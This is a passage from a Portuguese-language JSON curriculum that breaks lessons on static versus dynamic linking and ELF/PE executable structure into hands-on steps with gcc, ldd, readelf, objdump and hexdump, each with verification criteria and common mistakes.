                                    "nm programa_estatico para ver símbolos resolvidos de libmath.",
                                    "strip --strip-unneeded para limpar, mas verificar antes."
                                  ],
                                  "verification": "ldd mostra 'statically linked' ou sem deps para funções custom; objdump lista símbolos.",
                                  "estimatedTime": "10 minutos",
                                  "materials": "ldd, objdump (binutils), programa_estatico",
                                  "tips": "ldd funciona melhor em Linux; otool -L no macOS.",
                                  "learningObjective": "Confirmar static linking via análise binária.",
                                  "commonMistakes": "Confundir com dynamic link; ldd mostra deps se falhar."
                                }
                              ],
                              "practicalExample": "Crie libmath.a com add/sub, main.c que soma 2+3=5 e sub 5-2=3. Compile/link: gcc -c libmath.c; ar rcs libmath.a libmath.o; gcc -c main.c; gcc main.o -L. -lmath -o calc. Rode ./calc -> output '5 3'. Verifique ldd calc (no math custom deps), objdump -t | grep add (símbolo presente).",
                              "finalVerifications": [
                                "Executável roda produzindo output correto sem runtime errors.",
                                "ldd não lista dependências para funções da biblioteca customizada.",
                                "objdump -t ou nm mostra símbolos da lib incorporados.",
                                "Tamanho do executável aumentou proporcionalmente ao código da lib.",
                                "Strip do executável mantém funcionalidade sem símbolos debug.",
                                "Comparação com versão dynamic link mostra ausência de .so deps."
                              ],
                              "assessmentCriteria": [
                                "Compilação sem warnings ou erros em todos os passos (100%).",
                                "Biblioteca .a criada corretamente com símbolos indexados (20%).",
                                "Link estático bem-sucedido sem undefined references (30%).",
                                "Verificação via ldd/objdump confirma incorporação (30%).",
                                "Código limpo, comentado e reproduzível (10%).",
                                "Tempo total dentro de 40-50 minutos com eficiência."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Entendimento de fases de compilação/linkagem.",
                                "Análise Binária: Uso de objdump/nm/ldd para reverse engineering.",
                                "Segurança Computacional: Static linking reduz superfície de ataque vs dynamic.",
                                "Sistemas Operacionais: Gerenciamento de bibliotecas e loaders.",
                                "Engenharia de Software: Construção de libs reutilizáveis."
                              ],
                              "realWorldApplication": "Em desenvolvimento de firmware embarcado (IoT/embedded), static linking garante executáveis self-contained sem dependências runtime, ideal para dispositivos sem filesystem completo ou em ambientes seguros onde dynamic libs introduzem riscos de hijacking."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.1.4.2.1"
                            ]
                          },
                          {
                            "id": "10.1.1.4.3.2",
                            "name": "Diferenciar linkagem estática e dinâmica",
                            "description": "Comparar executáveis linkados estaticamente vs dinamicamente usando size, ldd e readelf, entendendo impactos em tamanho e dependências em runtime.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar ambiente e compilar executáveis estático e dinâmico",
                                  "subSteps": [
                                    "Instale ferramentas necessárias: gcc, binutils (incluindo ldd, readelf, size).",
                                    "Crie um programa C simples (ex: hello world que chama uma função de libc).",
                                    "Compile versão dinâmica: gcc -o hello_dyn hello.c",
                                    "Compile versão estática: gcc -static -o hello_static hello.c",
                                    "Verifique se ambos executam corretamente com ./hello_dyn e ./hello_static"
                                  ],
                                  "verification": "Confirme que ambos os executáveis foram gerados e rodam sem erros usando ls -la e execução direta.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "GCC compiler",
                                    "Editor de texto (vim/nano)",
                                    "Sistema Linux com binutils"
                                  ],
                                  "tips": "Use -Wall no gcc para detectar warnings durante compilação.",
                                  "learningObjective": "Entender o processo de compilação e como especificar linkagem estática vs dinâmica.",
                                  "commonMistakes": [
                                    "Esquecer de instalar binutils",
                                    "Não usar -static corretamente levando a falha na compilação estática",
                                    "Programa sem dependências externas, invalidando análise"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Comparar tamanhos dos executáveis usando o comando size",
                                  "subSteps": [
                                    "Execute size hello_dyn e anote os valores de text, data, bss e total.",
                                    "Execute size hello_static e compare os valores com o dinâmico.",
                                    "Calcule a diferença percentual no tamanho total.",
                                    "Explique por quê o estático é maior (bibliotecas embutidas).",
                                    "Repita com strip hello_dyn -s e strip hello_static -s para comparar versões otimizadas."
                                  ],
                                  "verification": "Tabela comparativa mostrando tamanhos maiores no estático (tipicamente 1-10MB vs <10KB dinâmico).",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Executáveis hello_dyn e hello_static",
                                    "Comando size"
                                  ],
                                  "tips": "Use size -A para detalhes por seção e melhor compreensão.",
                                  "learningObjective": "Identificar impacto da linkagem no tamanho do binário via análise de seções.",
                                  "commonMistakes": [
                                    "Ignorar seções bss que afetam tamanho real em disco",
                                    "Comparar sem strip, inflando dinâmicos com símbolos de debug",
                                    "Confundir tamanho em disco (ls) com size"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar dependências em runtime com ldd",
                                  "subSteps": [
                                    "Execute ldd hello_dyn e liste todas as bibliotecas compartilhadas resolvidas.",
                                    "Execute ldd hello_static e observe 'not a dynamic executable' ou lista vazia.",
                                    "Teste portabilidade copiando hello_dyn para outro diretório sem libs e execute (deve falhar).",
                                    "Copie hello_static e execute (deve funcionar).",
                                    "Verifique com ldd --version para confirmar ferramenta."
                                  ],
                                  "verification": "ldd no dinâmico mostra libs como libc.so; no estático, nenhuma ou mensagem de não-dinâmico.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Executáveis hello_dyn e hello_static",
                                    "Comando ldd"
                                  ],
                                  "tips": "Use LD_DEBUG=libs ./hello_dyn para debug detalhado de loading de libs.",
                                  "learningObjective": "Compreender dependências runtime e portabilidade entre estático e dinâmico.",
                                  "commonMistakes": [
                                    "Executar ldd em estático e interpretar errado",
                                    "Não testar em ambiente sem libs",
                                    "Confundir ldd com dependências de build"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Examinar detalhes de linkagem com readelf e sintetizar diferenças",
                                  "subSteps": [
                                    "Execute readelf -h hello_dyn e note 'Type: DYN' e headers de dynamic section.",
                                    "Execute readelf -h hello_static e note 'Type: EXEC' sem dynamic section.",
                                    "Use readelf -d hello_dyn para ver tags como NEEDED (libs dinâmicas).",
                                    "Compare readelf -S para seções (procure .dynstr, .dynamic no dinâmico).",
                                    "Documente impactos: tamanho, dependências, portabilidade, segurança."
                                  ],
                                  "verification": "Relatório resumindo diferenças em headers, seções e implicações.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Executáveis hello_dyn e hello_static",
                                    "Comando readelf"
                                  ],
                                  "tips": "Combine com objdump -p para mais info sobre dynamic linking.",
                                  "learningObjective": "Analisar formato ELF para diferenciar tipos de linkagem e impactos.",
                                  "commonMistakes": [
                                    "Não usar flags corretas (-h, -d, -S)",
                                    "Ignorar que readelf varia por arquitetura",
                                    "Confundir EXEC com DYN sem checar seções"
                                  ]
                                }
                              ],
                              "practicalExample": "Crie um programa C 'math_app.c' que usa funções de math.h (sin, cos). Compile dinâmico (gcc -o math_dyn math_app.c -lm) e estático (gcc -static -o math_static math_app.c -lm). Use size para ver math_static ~2MB vs math_dyn ~8KB; ldd math_dyn mostra libm.so.6; readelf -d math_dyn lista NEEDED libm. Teste rodando math_dyn em container sem libm (falha) vs math_static (sucesso).",
                              "finalVerifications": [
                                "Explicar verbalmente 3 diferenças chave entre linkagem estática e dinâmica.",
                                "Executar size, ldd e readelf em novos binários e interpretar saídas corretamente.",
                                "Prever comportamento de um binário dinâmico em ambiente sem libs.",
                                "Identificar tipo de linkagem de um binário desconhecido usando ldd/readelf.",
                                "Discutir prós/contras em termos de tamanho, portabilidade e segurança.",
                                "Criar tabela comparativa precisa de tamanhos e dependências."
                              ],
                              "assessmentCriteria": [
                                "Precisão na execução e interpretação de size (diferença >90% correta).",
                                "Correta identificação de dependências via ldd (lista completa no dinâmico).",
                                "Análise correta de ELF headers com readelf (DYN vs EXEC).",
                                "Explicação clara de impactos em runtime/portabilidade.",
                                "Uso adequado de substeps sem erros comuns.",
                                "Síntese coerente das diferenças em relatório final."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Entender flags de gcc e bibliotecas.",
                                "Sistemas Operacionais: Gerenciamento de processos e loading de bibliotecas compartilhadas.",
                                "Segurança Computacional: Vulnerabilidades em shared libs vs isolamento em estáticos.",
                                "Engenharia de Software: Trade-offs em deploy (portabilidade vs tamanho)."
                              ],
                              "realWorldApplication": "Em segurança, binários dinâmicos são comuns mas vulneráveis a hijacking de libs (ex: LD_PRELOAD attacks); estáticos usados em forensics/malware analysis por portabilidade, ou em containers Docker minimalistas sem base images pesadas."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.1.4.3.1"
                            ]
                          },
                          {
                            "id": "10.1.1.4.3.3",
                            "name": "Examinar estrutura ELF ou PE",
                            "description": "Usar readelf (ELF) ou dumpbin (PE) para inspecionar headers, seções e tabela de símbolos dinâmica no executável linkado, relacionando com engenharia reversa.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o Ambiente e Obter Executável de Exemplo",
                                  "subSteps": [
                                    "Instale ferramentas: readelf (pacote binutils no Linux) ou dumpbin (Visual Studio no Windows).",
                                    "Compile um programa C simples: crie hello.c com printf('Hello'), compile com gcc -o hello hello.c para ELF ou cl para PE.",
                                    "Verifique o binário inicial com 'file hello' (Linux) ou 'dumpbin /headers hello.exe' para confirmar formato.",
                                    "Copie o binário para um diretório de trabalho limpo.",
                                    "Documente o comando de compilação usado para referência futura."
                                  ],
                                  "verification": "Confirme que readelf/dumpbin executa sem erros e o binário é reconhecido como ELF/PE válido.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "GCC ou MSVC compiler",
                                    "Terminal Linux ou Command Prompt Windows",
                                    "Arquivo fonte C simples"
                                  ],
                                  "tips": "Use static linking inicialmente (-static) para simplificar análise de símbolos.",
                                  "learningObjective": "Configurar ambiente seguro para análise estática de binários.",
                                  "commonMistakes": [
                                    "Executar ferramentas sem privilégios adequados",
                                    "Compilar com otimizações altas (-O3) que obfuscam símbolos",
                                    "Usar binários de sistema protegidos"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Inspecionar Headers Principais do Executável",
                                  "subSteps": [
                                    "Execute 'readelf -h hello' para ELF e interprete campos: Magic, Class, Data, Version, OS/ABI, Entry point.",
                                    "Para PE: 'dumpbin /headers hello.exe' e note DOS header, NT headers, optional header (ImageBase, Subsystem).",
                                    "Anote o entry point address e machine type (x86_64 ou x86).",
                                    "Compare com documentação oficial (ELF spec ou PE format).",
                                    "Salve output em arquivo de texto para anotações."
                                  ],
                                  "verification": "Liste corretamente pelo menos 5 campos chave dos headers (ex: entry point, ABI).",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "readelf ou dumpbin",
                                    "Binário hello",
                                    "Documentação ELF/PE (man pages ou online)"
                                  ],
                                  "tips": "Foque no entry point: é onde a execução começa, crucial para RE.",
                                  "learningObjective": "Entender estrutura de headers e seu papel no carregamento do executável.",
                                  "commonMistakes": [
                                    "Confundir ELF Class (32/64-bit) com Data (endianness)",
                                    "Ignorar ABI para cross-plataforma",
                                    "Não notar ASLR implications no ImageBase"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Examinar Seções e Headers de Seções",
                                  "subSteps": [
                                    "Rode 'readelf -S hello' para listar seções ELF: .text, .data, .bss, permissions (RWE).",
                                    "Para PE: 'dumpbin /headers' ou '/section:all' para seções como .text, .rdata, virtual size/characteristics.",
                                    "Identifique seções executáveis (.text) vs dados (.data), note offsets e sizes.",
                                    "Use 'readelf --sections=NAME,OFFSET,SIZE' para tabela focada.",
                                    "Desenhe um mapa mental ligando seções ao layout de memória."
                                  ],
                                  "verification": "Descreva pelo menos 4 seções principais com suas permissões e propósitos.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "readelf/dumpbin",
                                    "Binário hello",
                                    "Editor de texto para mapas"
                                  ],
                                  "tips": "Seções com W+E são suspeitas em RE (possíveis shellcodes).",
                                  "learningObjective": "Mapear layout de seções e entender alocação de memória estática.",
                                  "commonMistakes": [
                                    "Confundir virtual size com raw size",
                                    "Ignorar seções padding (.rela.dyn)",
                                    "Não checar alignments"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Tabela de Símbolos Dinâmica e Relacionar com Engenharia Reversa",
                                  "subSteps": [
                                    "Execute 'readelf -D hello' para ELF dynamic symbols: DT_NEEDED libs, DT_SYMTAB, hash table.",
                                    "Para PE: 'dumpbin /imports' para tabelas de importação e exports (/exports).",
                                    "Identifique funções como printf (de libc), trace dependencies.",
                                    "Relacione com RE: entry point chama main? Símbolos hintam funções internas.",
                                    "Simule carregamento: como loader resolve símbolos dinâmicos."
                                  ],
                                  "verification": "Liste 3+ símbolos dinâmicos e explique seu papel em RE (ex: hooks em imports).",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "readelf -D ou dumpbin /imports",
                                    "ldd hello (Linux deps)",
                                    "Hex editor opcional"
                                  ],
                                  "tips": "Use objdump -T para símbolos mais detalhados se readelf insuficiente.",
                                  "learningObjective": "Conectar símbolos dinâmicos a fluxos de execução em RE.",
                                  "commonMistakes": [
                                    "Confundir símbolos locais vs globais",
                                    "Ignorar PLT/GOT para chamadas indiretas",
                                    "Não considerar stripping de binários"
                                  ]
                                }
                              ],
                              "practicalExample": "Compile 'hello.c' com gcc -o hello hello.c. Rode: readelf -h hello (veja entry 0x401000), readelf -S (seções .text 0x100 bytes RWX? Não, RX), readelf -D (DT_NEEDED libc.so.6, símbolos como printf@GLIBC). Em RE, entry chama _start -> main -> printf via PLT.",
                              "finalVerifications": [
                                "Lista headers principais com entry point correto.",
                                "Identifica e descreve 5+ seções com offsets/sizes.",
                                "Explica tabela dinâmica: libs dependentes e símbolos chave.",
                                "Relaciona achados a pontos de entrada para RE (ex: patching entry).",
                                "Gera mapa de binário sem erros factuais.",
                                "Compara ELF vs PE diferenças observadas."
                              ],
                              "assessmentCriteria": [
                                "Precisão na interpretação de outputs de ferramentas (90%+ correção).",
                                "Profundidade na análise de seções e símbolos (cobre permissões, dependências).",
                                "Habilidade em relacionar estrutura a cenários RE (ex: exploits em imports).",
                                "Clareza em documentação e mapas visuais.",
                                "Eficiência temporal: completa em <90 min.",
                                "Criatividade em extensões (ex: testar binário stripped)."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: entender geração de código objeto.",
                                "Sistemas Operacionais: loaders ELF/PE e resolução dinâmica.",
                                "Segurança de Software: detecção de packing/obfuscation em seções.",
                                "Análise de Malware: tracing imports para C2 servers.",
                                "Arquitetura de Computadores: layout memória e permissões."
                              ],
                              "realWorldApplication": "Em engenharia reversa de malware, analistas usam readelf/dumpbin para mapear seções infectadas, identificar imports suspeitos (ex: CreateRemoteThread) e entry points para desassembly, facilitando detecção e mitigação em ferramentas como IDA Pro ou Ghidra."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.1.4.2.2"
                            ]
                          },
                          {
                            "id": "10.1.1.4.3.4",
                            "name": "Criar executável com bibliotecas",
                            "description": "Linkar um programa C com libc estática ou dinâmica, executando e analisando dependências para entender carregamento em memória.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar ambiente e escrever programa C simples",
                                  "subSteps": [
                                    "Instale o GCC e ferramentas básicas (ldd, objdump) via gerenciador de pacotes (ex: apt install build-essential binutils).",
                                    "Crie um arquivo main.c com um programa que use funções da libc: #include <stdio.h>, #include <stdlib.h>; int main() { printf(\"Hello\\n\"); char* p = malloc(10); free(p); return 0; }.",
                                    "Salve o arquivo em um diretório de trabalho limpo.",
                                    "Verifique sintaxe com gcc -Wall main.c -c -o main.o para identificar erros iniciais.",
                                    "Compile sem erros para garantir base sólida."
                                  ],
                                  "verification": "Arquivo main.c existe sem erros de sintaxe e compila para main.o sem warnings.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Linux terminal, GCC, editor de texto (vim/nano)",
                                  "tips": "Use flags -Wall -Wextra para detectar problemas cedo.",
                                  "learningObjective": "Entender como programas C dependem da libc para I/O e gerenciamento de memória.",
                                  "commonMistakes": "Esquecer includes ou mismatched free/malloc."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Compilar para código objeto sem linkagem",
                                  "subSteps": [
                                    "Execute: gcc -c main.c -o main.o",
                                    "Verifique o objeto com: file main.o (deve mostrar ELF relocatable).",
                                    "Inspecione símbolos não resolvidos: nm main.o | grep U (deve listar printf, malloc, etc.).",
                                    "Use objdump -t main.o para tabela de símbolos.",
                                    "Confirme ausência de executável: ./main.o falha."
                                  ],
                                  "verification": "main.o gerado, nm mostra símbolos undefined da libc.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "GCC, nm, objdump",
                                  "tips": "nm -D para símbolos dinâmicos se aplicável.",
                                  "learningObjective": "Identificar dependências externas no código objeto.",
                                  "commonMistakes": "Confundir -c (objeto) com -o sem flags."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Linkar dinamicamente com libc e analisar dependências",
                                  "subSteps": [
                                    "Linke: gcc main.o -o main_dynamic",
                                    "Verifique dependências: ldd main_dynamic (deve listar libc.so).",
                                    "Execute: ./main_dynamic e observe saída 'Hello'.",
                                    "Use readelf -d main_dynamic | grep NEEDED para confirmar libs.",
                                    "Inspecione headers: readelf -h main_dynamic."
                                  ],
                                  "verification": "Executável roda, ldd mostra libc dinâmica.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "ldd, readelf",
                                  "tips": "LD_LIBRARY_PATH para testar paths customizados.",
                                  "learningObjective": "Compreender linkagem dinâmica e resolução em runtime.",
                                  "commonMistakes": "Executável não roda por libs ausentes em PATH."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Executar e analisar carregamento em memória",
                                  "subSteps": [
                                    "Execute com strace: strace ./main_dynamic para ver syscalls de carregamento.",
                                    "Use gdb: gdb ./main_dynamic, run, info proc mappings para ver memória mapeada.",
                                    "Observe carregamento da libc via lsof -p $(pidof main_dynamic).",
                                    "Compare tamanhos: ls -lh main_dynamic vs libc.so.",
                                    "Analise seções: objdump -h main_dynamic."
                                  ],
                                  "verification": "strace/gdb mostram mmap da libc em runtime.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "strace, gdb, lsof",
                                  "tips": "Instale gdb se necessário: apt install gdb.",
                                  "learningObjective": "Visualizar como loader resolve e carrega libs dinâmicas.",
                                  "commonMistakes": "Não capturar PID correto ou ignorar ASLR."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Linkar estaticamente e comparar",
                                  "subSteps": [
                                    "Linke estático: gcc main.c -static -o main_static (usa libc.a).",
                                    "Verifique: ldd main_static (not a dynamic executable).",
                                    "Compare tamanhos: ls -lh main_static (muito maior).",
                                    "Execute ambos e compare strace para diferenças em syscalls.",
                                    "Analise: objdump -p main_static | grep NEEDED (nenhum)."
                                  ],
                                  "verification": "main_static roda sem dependências externas, maior que dinâmico.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "musl-gcc ou libc.a disponível",
                                  "tips": "Use musl-gcc para static puro se glibc falhar.",
                                  "learningObjective": "Contraste entre linkagem estática/dinâmica em tamanho e carregamento.",
                                  "commonMistakes": "Falta de libc.a leva a link fallido."
                                }
                              ],
                              "practicalExample": "Programa main.c que imprime 'Hello' usando printf e aloca/libera memória com malloc/free. Linkado dinamicamente: ldd mostra /lib/x86_64-linux-gnu/libc.so.6; estático resulta em binário de ~1MB standalone.",
                              "finalVerifications": [
                                "Executáveis dinâmico e estático compilam e rodam sem erros.",
                                "ldd confirma dependências apenas no dinâmico.",
                                "strace/gdb mostram carregamento da libc em runtime para dinâmico.",
                                "Tamanhos diferem significativamente (estático maior).",
                                "nm/objdump revelam símbolos resolvidos/undefined corretamente.",
                                "Nenhuma dependência externa no estático via readelf."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de símbolos undefined (nm).",
                                "Correta análise de dependências (ldd/readelf).",
                                "Evidência de observação de carregamento em memória (strace/gdb).",
                                "Comparação válida entre linkagens dinâmica/estática.",
                                "Programa usa múltiplas funções libc sem crashes.",
                                "Relatório explica trade-offs (tamanho vs flexibilidade)."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Loaders ELF e dynamic linking.",
                                "Programação em C: Gerenciamento de memória e bibliotecas.",
                                "Segurança Computacional: Análise de binários para vulnerabilidades em libs.",
                                "Engenharia de Software: Otimização de builds (static vs shared)."
                              ],
                              "realWorldApplication": "Em análise de malware, engenheiros de segurança criam binários estáticos para isolamento ou analisam dependências dinâmicas em amostras para entender propagação de exploits via libs compartilhadas como libc."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.1.4.3.1"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.1.5",
                    "name": "Formatos de Arquivos Executáveis ELF e PE",
                    "description": "Estrutura e componentes dos formatos ELF (Linux) e PE (Windows) gerados na compilação.",
                    "individualConcepts": [
                      {
                        "id": "10.1.1.5.1",
                        "name": "Formato ELF (Linux)",
                        "description": "Estrutura detalhada do Executable and Linkable Format (ELF), incluindo cabeçalhos, seções e segmentos gerados durante a compilação de código em sistemas Linux/Unix.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.5.1.1",
                            "name": "Identificar e interpretar o cabeçalho principal ELF",
                            "description": "Reconhecer o magic number (0x7F 'ELF'), classe (32/64 bits), endianness, versão, tipo de arquivo (executável, compartilhado, relocável) e ABI/OS, utilizando ferramentas como readelf ou hexdump para analisar um binário ELF.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Estudar a estrutura básica do cabeçalho ELF",
                                  "subSteps": [
                                    "Acesse a especificação ELF oficial (man 5 elf ou PDF da toolchain docs).",
                                    "Identifique os 16 bytes iniciais: e_ident[0-3] (magic: 0x7F 'ELF'), e_ident[4] (classe: 1=32-bit, 2=64-bit), e_ident[5] (endian: 1=little, 2=big), e_ident[6] (versão: 1), e_ident[7] (OS/ABI), e_ident[8] (ABI version).",
                                    "Memorize e_type (após pad): 1=relocatable, 2=executable, 3=shared object, 4=core dump.",
                                    "Visualize o layout com um diagrama ASCII ou ferramenta de desenho.",
                                    "Anote tamanhos: cabeçalho total 52/64 bytes dependendo da classe."
                                  ],
                                  "verification": "Recite verbalmente ou por escrito os campos dos primeiros 16 bytes e seus valores padrão.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação ELF (man elf ou https://refspecs.linuxfoundation.org/elf/elf.pdf)",
                                    "Editor de texto ou bloco de notas"
                                  ],
                                  "tips": "Crie um mapa mental ou tabela para os bytes e seus significados para facilitar a memorização.",
                                  "learningObjective": "Compreender a composição exata e os valores padronizados do cabeçalho ELF.",
                                  "commonMistakes": [
                                    "Confundir byte de classe (EI_CLASS) com endian (EI_DATA).",
                                    "Ignorar bytes de padding (EI_PAD).",
                                    "Assumir versão sempre 1 sem verificar."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Examinar magic number e campos iniciais com hexdump",
                                  "subSteps": [
                                    "Selecione um binário ELF simples como /bin/ls em um terminal Linux.",
                                    "Execute 'hexdump -C /bin/ls | head -n 1' para ver os primeiros bytes.",
                                    "Identifique 7F 45 4C 46 como magic number (0x7F ELF).",
                                    "Analise byte 5: 01=little endian, 02=big endian; byte 4: 01=32-bit, 02=64-bit.",
                                    "Verifique byte 7 (OS/ABI: 0=UNIX System V, 3=Linux) e byte 8 (versão ABI)."
                                  ],
                                  "verification": "Anote os primeiros 16 bytes em hex e rotule cada campo corretamente.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Terminal Linux/WSL",
                                    "Binário ELF como /bin/ls",
                                    "Comando hexdump"
                                  ],
                                  "tips": "Use 'xxd' como alternativa ao hexdump para visualização mais limpa.",
                                  "learningObjective": "Ler e interpretar manualmente os bytes iniciais de um binário ELF.",
                                  "commonMistakes": [
                                    "Ler endianness errado devido à própria endian do sistema.",
                                    "Confundir magic com string ASCII sem hex.",
                                    "Não considerar que hexdump mostra little-endian por default."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Utilizar readelf para dump e interpretação do cabeçalho",
                                  "subSteps": [
                                    "Instale binutils se necessário ('sudo apt install binutils').",
                                    "Execute 'readelf -h /bin/ls' e analise a saída seção por seção.",
                                    "Interprete: Magic, Class (ex: ELF64), Data (LSB=Little Endian), Version, OS/ABI (UNIX - System V), ABI Version, Type (EXEC).",
                                    "Compare saída do readelf com hexdump para validar bytes manuais.",
                                    "Teste em um binário diferente, como 'ldd /bin/ls' para shared objects."
                                  ],
                                  "verification": "Explique linha por linha a saída do readelf para um binário dado.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "readelf (binutils)",
                                    "Vários binários ELF (/bin/ls, /lib/x86_64-linux-gnu/libc.so.6)"
                                  ],
                                  "tips": "Use 'readelf -hW' para largura total se a saída estiver truncada.",
                                  "learningObjective": "Dominar a ferramenta readelf para análise rápida de cabeçalhos ELF.",
                                  "commonMistakes": [
                                    "Interpretar Type errado (ex: confundir EXEC com DYN).",
                                    "Ignorar Machine field após Type.",
                                    "Não testar em 32-bit (use 'apt install gcc-multilib')."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar interpretação completa em múltiplos binários",
                                  "subSteps": [
                                    "Colete 3 binários: executable 64-bit (/bin/ls), shared lib (libc.so), relocatable (gcc -c test.c -o test.o).",
                                    "Para cada: hexdump + readelf, identifique classe, endian, versão, type, ABI/OS.",
                                    "Documente em tabela: binário | magic | class | endian | type | ABI.",
                                    "Discuta variações (ex: Android ELF tem OS/ABI=3 com flags).",
                                    "Verifique com 'file' command para confirmação rápida."
                                  ],
                                  "verification": "Submeta tabela com análises 100% precisas para pelo menos 3 binários.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Binários variados",
                                    "gcc para gerar .o",
                                    "readelf, hexdump, file"
                                  ],
                                  "tips": "Gere binários custom com 'gcc -m32' para 32-bit ou cross-compile para big-endian.",
                                  "learningObjective": "Aplicar conhecimento para classificar e interpretar cabeçalhos ELF variados.",
                                  "commonMistakes": [
                                    "Assumir todos são 64-bit little-endian x86.",
                                    "Não notar diferenças em ABI para embedded (ARM).",
                                    "Confundir relocatable (ET_REL) com executable."
                                  ]
                                }
                              ],
                              "practicalExample": "Analise /bin/ls: hexdump mostra 7F 45 4C 46 02 01 01 00 00 00 00 00 00 00 00 00 (64-bit little-endian, SysV); readelf -h confirma ELF64, LSB executable, x86-64, Type: EXEC (0x2), OS/ABI: UNIX - System V.",
                              "finalVerifications": [
                                "Identifica magic number 0x7F ELF em qualquer hex dump.",
                                "Distingue corretamente 32-bit vs 64-bit e little vs big endian.",
                                "Classifica type (REL, EXEC, DYN, CORE) via readelf ou manual.",
                                "Explica OS/ABI e implicações (ex: Linux vs FreeBSD).",
                                "Valida cabeçalho com múltiplas ferramentas (hexdump, readelf, file).",
                                "Detecta cabeçalhos inválidos ou não-ELF."
                              ],
                              "assessmentCriteria": [
                                "Precisão na decodificação de bytes hex para campos ELF.",
                                "Correta interpretação sem depender apenas de readelf (manual via hexdump).",
                                "Proficiência com ferramentas: saída limpa e explicada.",
                                "Identificação de variações em diferentes arquiteturas/tipos.",
                                "Clareza na documentação de análises.",
                                "Detecção e explicação de erros comuns em binários malformados."
                              ],
                              "crossCurricularConnections": [
                                "Engenharia de Software: Entender linkers e loaders na compilação.",
                                "Segurança Computacional: Análise de binários em reverse engineering e malware.",
                                "Arquitetura de Computadores: Endianness e representações binárias.",
                                "Programação em C/Assembly: Geração e inspeção de objetos executáveis.",
                                "Sistemas Operacionais: Formatos de executáveis e ABI compatibilidade."
                              ],
                              "realWorldApplication": "Na análise forense digital e segurança, inspecionar cabeçalhos ELF de binários suspeitos para determinar arquitetura alvo, tipo (ex: malware como shared lib) e compatibilidade OS/ABI, essencial para debugging cross-platform, detecção de packing ou emulação em ferramentas como Ghidra/IDA Pro."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.5.1.2",
                            "name": "Descrever seções e tabela de seções no ELF",
                            "description": "Explicar componentes como .text (código executável), .data (dados inicializados), .bss (dados não inicializados), .symtab (símbolos) e .strtab (strings), incluindo offsets, tamanhos e flags de permissão (r/w/x).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a Estrutura Geral da Tabela de Seções no ELF",
                                  "subSteps": [
                                    "Estude o cabeçalho ELF (Ehdr) que aponta para a seção de cabeçalhos (shoff).",
                                    "Aprenda que a tabela de seções (Section Header Table) contém entradas (Shdr) com campos como sh_name, sh_type, sh_flags, sh_addr, sh_offset, sh_size.",
                                    "Identifique o índice 0 como seção nula e o sh_link/sh_info para relacionamentos entre seções.",
                                    "Revise o papel da string table (.shstrtab) para nomes de seções.",
                                    "Pratique diagramando a layout de um arquivo ELF simples."
                                  ],
                                  "verification": "Desenhe um diagrama da tabela de seções e rotule os campos principais de uma Shdr.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Documentação ELF (man elf), diagrama de layout ELF online, editor de texto para anotações.",
                                  "tips": "Use cores diferentes para visualizar offsets e tamanhos no diagrama.",
                                  "learningObjective": "Explicar a localização e composição da tabela de seções no formato ELF.",
                                  "commonMistakes": "Confundir tabela de seções com tabela de segmentos (PT); foque em seções granulares."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e Descrever Seções Principais do ELF",
